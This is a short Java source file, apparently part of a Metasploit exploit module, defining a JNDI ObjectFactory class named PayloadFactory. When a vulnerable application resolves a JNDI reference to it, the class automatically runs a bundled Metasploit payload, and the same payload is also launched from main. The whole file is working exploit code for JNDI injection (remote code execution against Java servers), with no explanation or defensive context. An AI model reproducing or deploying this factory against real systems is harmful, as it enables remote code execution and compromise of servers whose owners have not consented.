package metasploit;
import java.util.Hashtable;
import javax.naming.*;

public class PayloadFactory implements javax.naming.spi.ObjectFactory {
	// Required method override to be a valid Factory
	public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
		System.out.println("Loading via factory...");
		Payload.main(null);
		return null;
	}
	// main method without which the class did not want to compile using javac -cp msf_payload.jar <this file>.java
        public static void main(String[] args) {
		try { Payload.main(null); } catch (Exception e) {
			e.printStackTrace();
		}
        }
}

